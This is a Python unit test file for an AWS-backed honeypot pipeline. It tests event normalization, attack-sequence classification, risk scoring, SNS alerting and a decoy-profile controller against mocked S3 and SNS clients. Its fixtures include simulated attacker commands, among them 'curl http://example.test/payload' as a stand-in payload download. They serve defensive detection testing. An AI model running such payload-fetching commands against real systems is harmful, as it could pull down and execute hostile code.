import json
import importlib.util
import os
import tempfile
import threading
import unittest
import urllib.request
from io import BytesIO
from unittest.mock import patch

os.environ.setdefault("AWS_ACCESS_KEY_ID", "test")
os.environ.setdefault("AWS_SECRET_ACCESS_KEY", "test")
os.environ.setdefault("AWS_DEFAULT_REGION", "us-east-1")
os.environ.setdefault("HONEYPOT_BUCKET", "test-bucket")
os.environ.setdefault("SNS_TOPIC_ARN", "arn:aws:sns:us-east-1:123456789012:test")
# These tests use mocked AWS clients and must not inherit a developer's profile.
os.environ.pop("AWS_PROFILE", None)
os.environ.pop("AWS_DEFAULT_PROFILE", None)

from normalization_schema import normalize_event
import orchestrator
import risk_assessment
import command_dispatcher

controller_spec = importlib.util.spec_from_file_location(
    "decoy_controller",
    os.path.join(os.path.dirname(__file__), "decoy-controller.py"),
)
if controller_spec is None or controller_spec.loader is None:
    raise ImportError("unable to load decoy controller for pipeline test")
decoy_controller = importlib.util.module_from_spec(controller_spec)
controller_spec.loader.exec_module(decoy_controller)


class FakeS3:
    def __init__(self, objects):
        self.objects = objects
        self.puts = []

    def get_object(self, Bucket, Key):
        return {"Body": BytesIO(json.dumps(self.objects[Key]).encode("utf-8"))}

    def put_object(self, **kwargs):
        self.puts.append(kwargs)
        self.objects[kwargs["Key"]] = json.loads(kwargs["Body"])

    def get_paginator(self, name):
        assert name == "list_objects_v2"
        objects = self.objects

        class Paginator:
            def paginate(self, Bucket, Prefix):
                yield {
                    "Contents": [
                        {"Key": key}
                        for key in sorted(objects)
                        if key.startswith(Prefix)
                    ]
                }

        return Paginator()


class PipelineTest(unittest.TestCase):
    def test_normalized_login_is_classified_and_scored(self):
        raw = {
            "source": "cowrie",
            "event_type": "cowrie.login.failed",
            "session_id": "session-1",
            "data": {"eventid": "cowrie.login.failed", "username": "root"},
        }
        event = normalize_event(raw)

        self.assertEqual(orchestrator.classify_event(event), "credential_attack")
        self.assertEqual(risk_assessment.classify_event(event), "credential_attack")
        alert = risk_assessment.build_alert(event, "credential_attack", 30)
        self.assertEqual(alert["risk_score"], 30)
        self.assertEqual(alert["session_id"], "session-1")

    def test_orchestrator_emits_one_command_for_ordered_same_session_events(self):
        events = {
            "normalized/01-login.json": {
                "event": {"id": "login", "type": "authentication", "action": "login"},
                "time": {
                    "event": "2026-09-23T10:00:00Z",
                    "ingested": "2026-09-23T10:01:00Z",
                },
                "process": {"command_line": None},
                "session": {"id": "session-2"},
            },
            "normalized/02-recon.json": {
                "event": {"id": "recon", "type": "command", "action": "input"},
                "time": {
                    "event": "2026-09-23T10:00:00Z",
                    "ingested": "2026-09-23T10:02:00Z",
                },
                "process": {"command_line": "uname -a"},
                "session": {"id": "session-2"},
            },
            "normalized/03-download.json": {
                "event": {"id": "download", "type": "command", "action": "input"},
                "time": {
                    "event": "2026-09-23T10:00:00Z",
                    "ingested": "2026-09-23T10:03:00Z",
                },
                "process": {"command_line": "curl http://example.test/payload"},
                "session": {"id": "session-2"},
            },
            "normalized/04-other-session.json": {
                "event": {"id": "other", "type": "authentication", "action": "login"},
                "time": {"event": "2026-09-23T10:02:00Z"},
                "process": {"command_line": None},
                "session": {"id": "session-3"},
            },
        }
        fake_s3 = FakeS3(events)

        with tempfile.TemporaryDirectory() as directory:
            state_file = os.path.join(directory, "processed.json")
            with patch.object(orchestrator, "s3", fake_s3), patch.object(
                orchestrator, "STATE_FILE", state_file
            ):
                orchestrator.main()
                orchestrator.main()

        self.assertEqual(len(fake_s3.puts), 1)
        action = json.loads(fake_s3.puts[0]["Body"])
        self.assertEqual(action["profile"], "investigation")
        self.assertEqual(action["filesystem"], "investigation")
        self.assertEqual(
            action["sequence"],
            ["credential_attack", "reconnaissance", "download_execution"],
        )
        self.assertEqual(
            action["sequence_event_ids"],
            ["login", "recon", "download"],
        )

    def test_orchestrator_does_not_trigger_for_out_of_order_events(self):
        events = {
            "normalized/recon.json": {
                "event": {"type": "command", "action": "input"},
                "time": {"event": "2026-09-23T10:01:00Z"},
                "process": {"command_line": "uname -a"},
                "session": {"id": "session-2"},
            },
            "normalized/login.json": {
                "event": {"type": "authentication", "action": "login"},
                "time": {"event": "2026-09-23T10:02:00Z"},
                "process": {"command_line": None},
                "session": {"id": "session-2"},
            },
            "normalized/download.json": {
                "event": {"type": "command", "action": "input"},
                "time": {"event": "2026-09-23T10:03:00Z"},
                "process": {"command_line": "curl http://example.test/payload"},
                "session": {"id": "session-2"},
            },
        }
        fake_s3 = FakeS3(events)

        with patch.object(orchestrator, "s3", fake_s3):
            self.assertEqual(
                orchestrator.find_ordered_sequences(
                    orchestrator.load_action_events()
                ),
                [],
            )
        self.assertEqual(fake_s3.puts, [])

    def test_risk_assessment_publishes_a_deduplicated_aggregate_report(self):
        events = {
            "normalized/recon.json": {
                "event": {"type": "command", "action": "input"},
                "time": {"event": "2026-09-23T10:01:00Z"},
                "process": {"command_line": "uname -a"},
                "session": {"id": "session-1"},
                "source": {"ip": "198.51.100.1"},
            },
            "normalized/login.json": {
                "event": {"type": "authentication", "action": "login"},
                "time": {"event": "2026-09-23T10:02:00Z"},
                "process": {"command_line": None},
                "session": {"id": "session-1"},
                "source": {"ip": "198.51.100.1"},
            },
            "normalized/download.json": {
                "event": {"type": "command", "action": "input"},
                "time": {"event": "2026-09-23T10:03:00Z"},
                "process": {"command_line": "curl http://example.test/payload"},
                "session": {"id": "session-1"},
                "source": {"ip": "198.51.100.1"},
            },
        }
        fake_s3 = FakeS3(events)
        fake_sns = unittest.mock.Mock()

        with tempfile.TemporaryDirectory() as directory:
            state_file = os.path.join(directory, "last-report.json")
            with patch.object(risk_assessment, "s3", fake_s3), patch.object(
                risk_assessment, "sns", fake_sns
            ), patch.object(risk_assessment, "REPORT_STATE_FILE", state_file):
                report = risk_assessment.run_once()
                risk_assessment.run_once()

        self.assertIsNotNone(report)
        self.assertEqual(fake_sns.publish.call_count, 1)
        notification = fake_sns.publish.call_args.kwargs
        message = json.loads(notification["Message"])
        self.assertEqual(notification["TopicArn"], risk_assessment.SNS_TOPIC_ARN)
        self.assertEqual(message["risk_level"], "critical")
        self.assertEqual(message["risk_score"], 100)
        self.assertEqual(message["detected_events"], 3)
        self.assertEqual(message["unique_sessions"], 1)
        self.assertEqual(message["top_source_ips"][0]["ip"], "198.51.100.1")

    def test_analyzers_use_paginated_normalized_listing(self):
        key = "normalized/source=cowrie/date=2026-09-23/event.json"
        fake_s3 = FakeS3({key: {}})
        with patch.object(orchestrator, "s3", fake_s3), patch.object(
            risk_assessment, "s3", fake_s3
        ):
            self.assertEqual(list(orchestrator.list_normalized_keys()), [key])
            self.assertEqual(list(risk_assessment.list_normalized_keys()), [key])

    def test_dispatcher_command_reaches_controller_and_applies_profile(self):
        key = "orchestrator/commands/command-1.json"
        fake_s3 = FakeS3({key: {"action": "switch_profile", "profile": "investigation"}})
        server = decoy_controller.ThreadingHTTPServer(
            ("127.0.0.1", 0),
            decoy_controller.ControllerHandler,
        )
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        with tempfile.TemporaryDirectory() as directory:
            state_file = os.path.join(directory, "processed.json")
            with patch.object(command_dispatcher, "s3", fake_s3), patch.object(
                command_dispatcher, "STATE_FILE", state_file
            ), patch.object(
                command_dispatcher,
                "CONTROLLER_URL",
                f"http://127.0.0.1:{server.server_port}/profile",
            ), patch.object(decoy_controller, "run_command") as run_command:
                try:
                    command_dispatcher.run_once(set())
                    command_dispatcher.run_once()
                finally:
                    server.shutdown()
                    server.server_close()
                    server_thread.join(timeout=2)

        self.assertEqual(run_command.call_count, 3)
        self.assertEqual(
            [call.args[0][-1] for call in run_command.call_args_list],
            ["clean/investigation", "investigation", "investigation"],
        )

    def test_controller_accepts_utf8_bom_in_profile_request(self):
        server = decoy_controller.ThreadingHTTPServer(
            ("127.0.0.1", 0),
            decoy_controller.ControllerHandler,
        )
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        request = urllib.request.Request(
            f"http://127.0.0.1:{server.server_port}/profile",
            data=b"\xef\xbb\xbf{\"profile\":\"baseline\"}",
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with patch.object(decoy_controller, "run_command") as run_command:
            try:
                with urllib.request.urlopen(request, timeout=5) as response:
                    result = json.load(response)
            finally:
                server.shutdown()
                server.server_close()
                server_thread.join(timeout=2)

        self.assertEqual(result, {"status": "applied", "profile": "baseline"})
        self.assertEqual(run_command.call_count, 3)


if __name__ == "__main__":
    unittest.main()
